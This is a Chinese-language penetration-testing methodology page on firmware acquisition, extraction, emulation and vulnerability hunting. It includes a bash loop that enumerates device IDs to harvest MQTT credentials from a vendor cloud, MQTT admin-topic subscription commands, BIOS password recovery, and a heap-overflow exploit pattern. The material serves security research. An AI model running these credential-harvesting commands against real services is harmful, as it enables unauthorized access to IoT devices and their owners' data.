# 固件分析

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **简介**

### 相关资源

有关从暴露的硬件接口获取固件，请参阅 [UART 控制台辅助固件转储](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) 和 [SPI flash 转储](../hardware-hacking/spi.md#dumping-firmware-from-eeproms)。有关在访问控制台前于启动时进行可重复的 UART 捕获，请参阅 [SCPI 控制的电源和示波器采集](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi)。

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

固件是设备正常运行所必需的软件，它负责管理并促进硬件组件与用户交互的软件之间的通信。固件存储在永久性存储器中，确保设备从通电时起即可访问关键指令，进而启动操作系统。检查并可能修改固件，是识别安全漏洞的关键步骤。<sup>[[2]](#references)[[3]](#references)</sup>

## **收集信息**

**收集信息**是了解设备构成及其所用技术的关键初始步骤。此过程包括收集以下数据：

- CPU 架构及其运行的操作系统
- Bootloader 详情
- 硬件布局和数据手册
- 代码库指标和源代码位置
- 外部库和许可证类型
- 更新历史和监管认证
- 架构图和流程图
- 安全评估和已发现的漏洞

为此，**开源情报（OSINT）**工具非常有用；同时，也可以通过手动和自动化审查流程分析任何可用的开源软件组件。[Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 等工具提供免费的静态分析，可用于查找潜在问题。

## **获取固件**

获取固件有多种方式，复杂程度各不相同：

- 直接从来源处获取（开发者、制造商）
- 按照提供的说明构建
- 从官方支持网站下载
- 使用 **Google dork** 查询查找托管的固件文件
- 直接访问**云存储**，可使用 [S3Scanner](https://github.com/sa7mon/S3Scanner) 等工具
- 使用中间人技术拦截**更新**
- 通过 **UART**、[**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) 或 **PICit** 等连接从设备中**提取**
- 嗅探设备通信中的更新请求
- 查找并使用**硬编码的更新端点**
- 从 Bootloader 或网络**转储**
- 如果其他方法都无效，则使用适当的硬件工具**拆下并读取**存储芯片

### 仅有 UART 日志：通过 flash 中的 U-Boot 环境变量强制启动 root shell

如果 UART RX 被忽略（只有日志），仍可通过离线**编辑 U-Boot 环境变量数据块**来强制启动 init shell：<sup>[[6]](#references)</sup>

1. 使用 SOIC-8 夹具和编程器（3.3V）转储 SPI flash：
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. 定位 U-Boot env 分区，编辑 `bootargs`，加入 `init=/bin/sh`，并**重新计算 U-Boot env CRC32**。
3. 仅重新刷写 env 分区并重启；UART 上应该会出现 shell。

这对引导加载程序 shell 已禁用、但可通过外部 Flash 访问写入 env 分区的嵌入式设备很有用。

### 通过 Firewall 复制任务泄露受保护代码

一些 MCU 允许未受保护的应用程序代码调用受保护区域网关，而不是直接读取受保护的 Flash。在获得应用程序代码执行能力后，应将每个网关任务作为独立的内存传输原语进行检查。在 Cypherock X1 案例中，STM32L4 Firewall 调用门接受一个任务、一个外部 `data` 指针、一个长度和一个受保护的 `address`。写入任务未能拒绝指向 Firewall Code 的 `data` 源指针。调用者无法直接读取该代码，但网关本身可以将其复制到受保护的非易失性存储中，再由允许的读取任务将其读出。<sup>[[15]](#references)</sup>

要复现此类泄露，请找到一个可写的受保护存储页及其对应的读取任务，将写入源设置为连续的受保护代码地址，然后读回暂存的字节。重复写入前，先检查存储介质：本案例中使用的是 Flash，因此重复使用前需要擦除页面。研究人员使用了一个例程来擦除并恢复有效的 Secure Data Storage 内容，然后将代码暂存到剩余空闲空间，而不是覆盖钱包数据。这需要在 MCU 上执行代码，并且能够访问调用门；它并非未经身份验证的主机可直接绕过读取限制。<sup>[[15]](#references)</sup>

恢复出的代码可能揭示[固件更新和启动完整性方面的信任缺口](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata)。<sup>[[15]](#references)</sup>

## 分析固件

现在你**已经拿到固件**，需要提取相关信息，以了解如何处理它。可以使用以下不同工具：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

如果使用这些工具没有发现太多内容，请用 `binwalk -E <bin>` 检查镜像的**熵**。如果熵较低，镜像可能没有加密；如果熵较高，则可能已加密（或经过某种压缩）。

此外，你可以使用这些工具提取**固件中嵌入的文件**：

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

也可以使用 [**binvis.io**](https://binvis.io/#/)（[code](https://code.google.com/archive/p/binvis/)）检查文件。

### 外部 flash 中的原始显示资源

外部 SPI dump 不一定是 MCU 的可执行固件。对于 Cortex-M 目标，请将每个候选代码区域的起始位置与设备内存映射进行比较：正常的向量表应以合理的 SRAM 栈指针和位于可执行内存中的复位处理程序地址开头。仅凭偏移量 0 处没有向量表，并不能证明整颗芯片都没有代码；请检查其他偏移量和启动布局。如果 `binwalk` 没有找到容器，请检查原始字节，并将[解码后的 SPI 捕获](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer)中的 flash 读取地址与加载新屏幕的操作对应起来。<sup>[[14]](#references)</sup>

对于显示资源区域，请尝试不同的像素格式和尺寸，而不要假定它使用 PNG/JPEG。文中所述设备使用 **80×160 RGB565 little-endian** 帧：每像素占两字节，因此一帧为 **25,600 字节**（25 KiB），而不是 24 千比特。解码后的 flash 读取地址确定了屏幕资源的偏移量；研究人员使用 `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb` 转换准备好的图像，将原始 dump 中等长的资源替换后，再使用 `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` 写入，并在显示屏上确认了新图像。这证明的是可写的*外部显示资源*，而不是提取或重刷 MCU 的内部固件。写入前，请保留原始 dump，并核对尺寸、字节序、偏移量和替换内容的长度。<sup>[[14]](#references)</sup>

### 差分 flash 分析与可恢复的 XOR 密钥存储

如果某项固件设置没有公开存储格式，请先进行多次匹配的 flash 读取，只更改**一项**设置，然后再次 dump 整颗芯片并比较各偏移量。用受控值重复实验，可以将该设置与计数器和写入元数据区分开来；如果更改出现在新偏移量而非原位置，说明存储区可能采用仅追加或日志结构。请保留已删除或被 tombstone 标记的条目，因为其载荷字节可能仍可恢复。<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

定位该区域后，使用 `binwalk` 等工具提取固件模块，并在 Ghidra 中逆向分析写入器/验证器。通过代码确认字段边界、填充、密钥索引和密钥派生方式，而不要仅凭密文模式推断加密方案。<sup>[[12]](#references)</sup>

#### 从加密的零填充中恢复密钥

如 [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) 中所述，相同偏移处的已知明文会揭示密钥流字节。当固定大小字段的零填充覆盖重复 XOR 密钥的所有索引时，该字段尤其容易泄露信息：加密后的填充会直接揭示这些密钥字节，因为 `0x00 XOR key_byte = key_byte`。如果覆盖了所有密钥索引，就可以从密文尾部重建密钥，并解密已填入数据的字节。<sup>[[12]](#references)</sup>

Dell 存在漏洞的 DVAR BIOS 密码格式就是一个具体示例：32 字节字段的第 `0` 个字节为明文，而第 `1..31` 个字节使用一个重复的 20 字节密钥。<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

对于长度为 `L` 的密码，`L..31` 位置在 XOR 前均为零。当 `L <= 12` 时，这些位置覆盖所有密钥索引，因此无需 brute force 即可恢复完整密钥和密码：<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 从历史记录中提取密钥

不要独立分析每条记录。DVAR 密钥近似由 `modified_md5(device_seed || variable_GUID || password[0])` 推导得出：device seed 和 GUID 是固定的，唯一取决于密码的输入是明文的首字节。因此，每台设备最多有 256 个密钥，且首字节相同的记录会共用一个密钥。按首字节对活动记录和已删除记录分组；一条较短的历史记录可能通过填充数据 leak 出完整密钥，并解密一条自身填充数据不足的较长当前记录。因此，如果密码轮换后只是将旧密文标记为已删除，而没有将其擦除，暴露风险可能会增加。<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) 工具可定位 DVAR、验证候选记录、恢复密码，并显示原始存储字节/密钥字节。从代码仓库检出并构建该工具，然后按以下步骤扫描已验证的 flash 镜像：<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

对于自定义解析器，应通过记录结构、可打印字符约束、零填充检查、密钥熵，以及密钥回绕时的一致性来排除误报。如果多次转储显示每次写入只有少量位发生翻转，应列出观察到的掩码，并依据这些约束对修正结果排序；但如果字符存在歧义，应明确报告，而不要将启发式输出说成精确恢复结果。<sup>[[12]](#references)</sup>

密码验证器应存储带盐并经过迭代的一次性哈希，而不是可逆密文；采用日志结构的存储应安全移除已被取代的秘密材料。<sup>[[12]](#references)</sup>

### 获取文件系统

使用前面提到的注释工具（如 `binwalk -ev <bin>`），你应该已经能够**提取文件系统**。\
Binwalk 通常会将其提取到一个**以文件系统类型命名的文件夹**中，通常是以下类型之一：squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### 手动提取文件系统

有时，binwalk 的特征签名中**没有文件系统的 magic byte**。遇到这种情况，使用 binwalk **查找文件系统的偏移量，并从二进制文件中切取压缩后的文件系统**，然后按照其类型使用以下步骤**手动提取**文件系统。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

运行以下 **dd command**，对 Squashfs 文件系统进行 carving。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

或者也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（上例中使用）

`$ unsquashfs dir.squashfs`

之后，文件会位于 "`squashfs-root`" 目录中。

- CPIO 归档文件

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 文件系统

`$ jefferson rootfsfile.jffs2`

- 对于使用 NAND flash 的 ubifs 文件系统

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### 重建拆分的嵌入式根文件系统

如果原始 eMMC/SSD 转储包含有效的文件系统头，但其元数据偏移超出了标称分区范围，不要立即将其判定为损坏。嵌入式引导代码可以通过 Device Mapper 将多个物理范围组合成实际的根设备，因此只提取一个 GPT 分区只能得到第一个片段。<sup>[[9]](#references)</sup>

#### 检查完整介质映像

首先确认采集已完成、映像大小稳定，并且没有写入程序仍在占用该映像。如果文件名中编码了起始/结束地址，请将该范围与实际字节数进行比较。以只读模式恢复 GPT，并仅挂载所需范围；不要在工作站上对不可信的物理卷运行 `vgchange -ay`，因为这可能导致卷组冲突和意外写入。<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

如果原始 init 逻辑或 LVM 堆栈必须读取完整镜像，最好使用一次性 VM。标准启动分区中的历史启动日志尤其有用：bootloader 可能记录了专有容器的偏移量、组件长度、slot 选择、对齐规则和签名验证信息。使用这些值提取嵌入的命令行/kernel/initramfs，然后分别用 `file`、magic bytes 和 `binwalk` 验证每个输出；读取到容器末尾可能会意外地把 initrd、ACPI 对象或签名附加到 kernel 后面。<sup>[[9]](#references)</sup>

#### 恢复启动时的块映射

提取 kernel 的 initramfs，并逆向分析其中的 `/init` 和任何存储库。在 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) 中，追踪 `/proc/cmdline`、`/dev/mapper/`、`dmsetup`、`BLKGETSIZE64` 和分区路径的字符串引用；然后跟踪选择活动 A/B slot 并构建映射表的代码。radare2 的实用起始命令包括 `r2 -A init`、`afl`、`pdf @ main` 和 `pdf @ fcn.xxxxx`。<sup>[[9]](#references)</sup>

linear target 会将虚拟设备的连续范围映射到一个或多个后端设备的范围。还原出的双段映射表通常如下所示（所有位置和长度的单位均为 512 字节扇区）：<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

精确复现机器码中的算术运算，包括整数位宽、移位和单位换算。例如，以下表达式会先将字节大小向下取整到 4-KiB 边界，然后才转换为 512-byte 扇区；若将其替换为 `p4_bytes // 512`，只要分区未按页对齐，选定的尾部位置就会偏移 `p4_bytes % 4096`。<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

按表格顺序以有界分块复制各个范围，重建平面分析镜像，而不是将完整媒体转储加载到内存中。这样也能避免创建设备端的 mapper 设备。将 GPT 推导出的偏移量、反转后的扇区计数和最终输出长度分别作为断言检查。<sup>[[9]](#references)</sup>

#### 区分损坏与固定的重建错误

对于 SquashFS，在运行 `unsquashfs` 之前，先检查 `hsqs` 魔数，并解码超级块偏移量 40 处的小端序 64 位 `bytes_used` 字段。如果多个互不相关的结构都提取失败，应在预期位置周围搜索较大的窗口，并要求找到强结构候选项：可解压的元数据块、多个连续的有效目录项、合理的 inode 字段、与 inode 数量相符的根 inode，或有效的完整性元数据结构。单独匹配到一个魔数并不足够。<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

当相同的有符号差值能让多个独立结构都变得有效（例如目录元数据和 verity 记录）时，可能的原因是系统性的段起始位置错误，而非缺失字节。重新检查反向运算，查找被丢弃的余数、符号性、溢出或扇区/页面对齐取整问题，然后再尝试恢复孤立数据或修补文件系统元数据。<sup>[[9]](#references)</sup>

最后，务必区分保护边界：由 TPM 封存的 LUKS 卷保护数据机密性，而签名的 dm-verity 映射保护根文件系统完整性。软件 TPM 无法恢复封存到原始物理 TPM 的密钥；通过省略 verity 验证的、仅供研究使用的 init 启动修改过的 SquashFS，也不会伪造其签名或破解 dm-verity。<sup>[[9]](#references)</sup>

## 分析固件

获取固件后，必须对其进行剖析，以了解其结构和潜在漏洞。此过程需要使用各种工具分析固件并从固件映像中提取有价值的数据。

### 初始分析工具

以下命令可用于初步检查二进制文件（记作 `<bin>`）。这些命令有助于识别文件类型、提取字符串、分析二进制数据，以及了解分区和文件系统的详细信息：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

要评估镜像的加密状态，可以使用 `binwalk -E <bin>` 检查其**熵**。熵较低通常表示未加密，而熵较高则表示可能经过加密或压缩。

要提取**嵌入文件**，推荐使用 **file-data-carving-recovery-tools** 文档和用于检查文件的 **binvis.io** 等工具和资源。

### 提取文件系统

使用 `binwalk -ev <bin>` 通常可以提取文件系统，提取结果通常位于以文件系统类型命名的目录中（例如 squashfs、ubifs）。但是，如果 **binwalk** 因缺少 magic bytes 而无法识别文件系统类型，就需要手动提取。具体做法是先用 `binwalk` 定位文件系统的偏移量，然后使用 `dd` 命令 carve 出文件系统：

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

之后，根据文件系统类型（例如 squashfs、cpio、jffs2、ubifs），使用不同的命令手动提取内容。

### 文件系统分析

提取文件系统后，便开始搜索安全漏洞。重点检查不安全的网络守护进程、硬编码凭据、API 端点、更新服务器功能、未编译的代码、启动脚本，以及用于离线分析的编译二进制文件。

需要检查的**关键位置**和**项目**包括：

- **etc/shadow** 和 **etc/passwd** 中的用户凭据
- **etc/ssl** 中的 SSL 证书和密钥
- 可能存在漏洞的配置文件和脚本文件
- 用于进一步分析的嵌入式二进制文件
- 常见 IoT 设备的 Web 服务器和二进制文件

以下工具可帮助发现文件系统中的敏感信息和漏洞：

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker)，用于搜索敏感信息
- [**固件分析与比较工具（FACT）**](https://github.com/fkie-cad/FACT_core)，用于全面的固件分析
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 和 [**EMBA**](https://github.com/e-m-b-a/emba)，用于静态和动态分析

### 对编译二进制文件进行安全检查

必须仔细检查文件系统中发现的源代码和编译二进制文件是否存在漏洞。**checksec.sh** 等工具可用于 Unix 二进制文件，**PESecurity** 可用于 Windows 二进制文件，帮助识别可能遭到利用的未受保护二进制文件。

## 通过派生的 URL token 获取云配置和 MQTT 凭据

许多 IoT hub 会从类似以下形式的云端点获取每台设备的配置：<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

在固件分析过程中，你可能会发现 `<token>` 是使用硬编码密钥，根据设备 ID 在本地派生的，例如：

- token = MD5( deviceId || STATIC_KEY )，并以大写十六进制表示

这种设计使得任何知道 deviceId 和 STATIC_KEY 的人都能还原 URL 并获取云配置，其中通常会包含明文 MQTT 凭据和 topic 前缀。

实际操作流程：

1) 从 UART 启动日志中提取 deviceId

- 连接 3.3V UART 适配器（TX/RX/GND）并捕获日志：

```bash
picocom -b 115200 /dev/ttyUSB0
```

- 查找打印 cloud config URL 模式和 broker 地址的行，例如：

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) 从 firmware 中恢复 STATIC_KEY 和 token algorithm

- 将 binaries 加载到 Ghidra/radare2，并搜索 config path（"/pf/"）或 MD5 用法。
- 确认算法（例如，MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中推导 token，并将摘要转换为大写：

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) 收集云配置和 MQTT 凭据

- 拼接 URL 并使用 curl 获取 JSON；用 jq 解析以提取密钥：

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 滥用明文 MQTT 和薄弱的 topic ACL（如果存在）

- 使用恢复的凭据订阅维护 topic，并查找敏感事件：

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 枚举可预测的设备 ID（大规模操作时需获得授权）

- 许多生态系统会将厂商 OUI/产品/类型字节与顺序递增的后缀组合起来。
- 你可以遍历候选 ID，以编程方式派生 token 并获取配置：

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- 尝试大规模枚举前，务必先获得明确授权。
- 尽可能优先使用仿真或静态分析来恢复 secrets，避免修改目标硬件。


仿真 firmware 的过程可对设备的运行过程或单个程序进行**动态分析**。这种方法可能会遇到硬件或架构依赖方面的挑战，但将根文件系统或特定二进制文件转移到架构和字节序匹配的设备（例如 Raspberry Pi）或预构建虚拟机上，可以便于进一步测试。

### 仿真单个二进制文件

检查单个程序时，识别程序的字节序和 CPU 架构至关重要。

#### MIPS 架构示例

要仿真 MIPS 架构的二进制文件，可以使用以下命令：

```bash
file ./squashfs-root/bin/busybox
```

以及安装必要的仿真工具：

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

对于 MIPS（big-endian），使用 `qemu-mips`；对于 little-endian 二进制文件，则使用 `qemu-mipsel`。

#### ARM 架构仿真

对于 ARM 二进制文件，流程类似，使用 `qemu-arm` 模拟器进行仿真。

### 完整系统仿真

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 等工具可实现完整固件仿真，自动化处理流程并辅助动态分析。

### 重建用于仿真的拆分式和经过验证的根文件系统

如果 SquashFS superblock 可读，但 inode、目录或 fragment table 的偏移不可能成立，不要立即修补 `unsquashfs`。应逆向分析早期启动二进制文件，并重现其创建的块设备图：嵌入式系统可能会提供名义上的 root 分区，但实际文件系统是通过 `dm-linear` 映射构建的，其中会附加从另一个分区借用的扇区。即使后续所有元数据块都发生偏移，仅检查 superblock 也可能成功。<sup>[[11]](#references)</sup>

精确保留固件中的运算方式。尤其要确认长度单位是字节、512 字节扇区还是 4 KiB 页面；按原始顺序重现移位和截断操作；并考虑 A/B 布局中依赖 bank 的尾部区域。例如，`(partition_bytes >> 12) << 3` 会先截断到 4 KiB 边界，然后再换算为 512 字节扇区；若将其替换为 `partition_bytes // 512`，追加区域的起始位置可能偏移几 KB，导致后续所有 SquashFS 表损坏。<sup>[[11]](#references)</sup>

一种实用的验证流程如下：<sup>[[11]](#references)</sup>

1. 从 verifier/init 二进制文件中恢复每个 `dm-linear` 段的源设备、起始扇区和长度。
2. 拼接或映射这些区域，同时保持其对齐语义不变。
3. 如果提取仍然失败，只在预测边界附近的小范围内搜索，并要求连续出现多个有效元数据结构，而不是仅凭看似合理的 superblock 就接受结果。
4. 使用未修改的 `unsquashfs` 处理重建后的镜像；成功遍历所有目录和 fragment，比 `unsquashfs -stat` 更能证明结果正确。

#### 由分析人员控制的 dm-verity 替换方案

当分析人员控制 QEMU 内核、initramfs 和虚拟磁盘时，可以用一个小型静态链接 init 替换厂商的验证 PID 1，从而启动修改后的根文件系统。这是**实验环境中的启动链替换**，并非破解 dm-verity、其 RSA 签名、Secure Boot 或 TPM 封装密钥。<sup>[[11]](#references)</sup>

替代 init 应复现原始启动流程中的关键操作：挂载 `devtmpfs`、调用 `setsid()`、将 `/dev/console` 连接到文件描述符 0–2、挂载 `/proc` 和 `/sys`、等待提供的块设备就绪、以只读方式挂载修改后的根文件系统、分离旧根文件系统的伪文件系统、将新挂载移动到 `/`、执行 `chroot`，并通过 `execve()` 启动固件原有的 `/sbin/init`。在 `MS_MOVE` **之前**分离 `/dev`、`/proc` 和 `/sys`，可避免意外分离属于新根文件系统的挂载点。<sup>[[11]](#references)</sup>

将可变设备状态与修改后的只读根文件系统分开。qcow2 overlay 可保留原始磁盘的 LVM 状态，同时使用第二块只读 virtio 磁盘提供修改后的 SquashFS：<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### 离线镜像状态调试

当启动缓慢、破坏性启动脚本或不可靠的控制台日志掩盖故障时，请检查虚拟机外部的持久化状态。切勿挂载正在被运行中 VM 使用的 overlay；使用 `qemu-nbd` 将其暴露出来，将 LVM 发现范围限制为目标 NBD 分区，并在断开连接前停用卷组。<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

为了可重复地隔离故障，请将带时间戳的标记文件写入稳定的可写卷，并在离线状态下验证；`/dev/kmsg`、FIFO 和临时控制台可能因速率限制或进程过早退出而产生假阴性。在更改无关代码之前，还应比较各层的具体接口：`uname -r` 与 `/lib/modules/`、磁盘上的 ext4 功能与内核配置，以及 Mesa `libGL` 的版本与 DRI 驱动 ABI 和根据 PCI 信息推导出的驱动名称。某个组件可能确实存在，甚至能够成功执行 `dlopen()`，但仍无法使用，因为它的使用方预期的是不同的 ABI。<sup>[[11]](#references)</sup>

## 实践中的动态分析

在此阶段，使用真实或仿真的设备环境进行分析。必须保持对 OS 和文件系统的 shell 访问。仿真可能无法完美模拟硬件交互，因此有时需要重启仿真。分析时应重新检查文件系统，利用暴露的网页和网络服务，并探索 bootloader 漏洞。固件完整性测试对于识别潜在的后门漏洞至关重要。

## 运行时分析技术

运行时分析是指在进程或二进制文件的运行环境中与其交互，并使用 gdb-multiarch、Frida 和 Ghidra 等工具设置断点，通过 fuzzing 和其他技术识别漏洞。

对于没有完整调试器的嵌入式目标设备，**将静态链接的 `gdbserver` 复制到设备上并远程附加**：<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor 消息映射

在 IoT hub 上，RF 协议栈通常由 **radio MCU** 和 Linux 用户态进程分担。一个实用的工作流程是梳理这条路径：<sup>[[8]](#references)</sup>

1. 空中传输的 **RF frame**
2. radio MCU 上的 **controller-side parser**
3. 转发到 Linux 的 **serial/UART text or TLV protocol**（例如 `/dev/tty*`）
4. 主 daemon 中的 **application dispatcher**
5. **protocol-specific handler / state machine**

这种架构带来了两个逆向目标，而不是一个。如果 controller 将二进制 radio frame 转换为 `Group,Command,arg1,arg2,...` 之类的文本协议，就需要还原：

- **message group** 和 dispatch table
- 哪些消息可以来自 **network**，哪些只能由 controller 自身发出
- 精确的 **manufacturer-specific discriminator field**（例如 Zigbee `manufacturer_code` 和自定义 `cluster_command`）
- 哪些 handler 只有在 **commissioning**、发现或固件/型号下载阶段才能触达

对于 Zigbee，具体做法是捕获配对流量，并检查目标设备是否仍使用默认 **Link Key** `ZigBeeAlliance09`。如果是，嗅探 commissioning 流量可能会暴露 **Network Key**。Zigbee 3.0 install code 可以降低这种风险，因此要记录受测设备是否确实强制要求使用它们。

### Manufacturer-specific protocol handler 和 FSM 门控的可达性

与标准化 cluster 相比，厂商专有的 Zigbee/ZCL 命令往往是更好的目标，因为它们会进入经过实战检验较少的 **custom parsing code** 和内部 **FSM**。<sup>[[8]](#references)</sup>

实用工作流程：

- 逆向分析 command dispatcher，直到找到 **vendor-only handler**。
- 还原 **FSM state**、**event**、**check**、**action** 和 **next-state** table。
- 找出会自动推进的 **transitional state**，以及最终会重置或释放攻击者可控状态的 retry/error 分支。
- 确认需要哪些合法的协议交互才能让 daemon 进入易受攻击的状态，而不是假设存在漏洞的 handler 始终可达。

对于对时序敏感的协议，使用 Python framework 重放数据包可能太慢。更可靠的做法是在真实硬件（例如 **nRF52840**）上模拟合法设备，并使用厂商级协议栈，从而暴露正确的 **endpoint**、**attribute** 和 commissioning 时序。

### 嵌入式 daemon 中的分片下载漏洞类型

一种常见的 firmware 漏洞出现在 **分片 blob/model/configuration 下载**中：<sup>[[8]](#references)</sup>

1. **第一个 fragment**（`offset == 0`）保存 `ctx->total_size`，并分配 `malloc(total_size)`。
2. 后续 fragment 只验证攻击者可控的**数据包局部**字段，例如 `packet_total_size >= offset + chunk_len`。
3. 执行复制时使用 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`，但不检查是否超出**最初分配的大小**。

攻击者可以：

- 发送一个声明了**较小** total size 的有效首个 fragment，强制进行小块 heap allocation。
- 后续再发送一个具有**预期 offset**、但 `chunk_len` 更大的 fragment。
- 伪造数据包局部 size，使其通过新一轮检查，同时仍溢出最初分配的 buffer。

如果存在漏洞的路径受 commissioning 逻辑控制，那么在发送畸形 fragment 前，exploit 必须包含足够的**设备模拟**，使目标进入预期的 model-download 或 blob-download 状态。

### 由协议触发的 `free()`

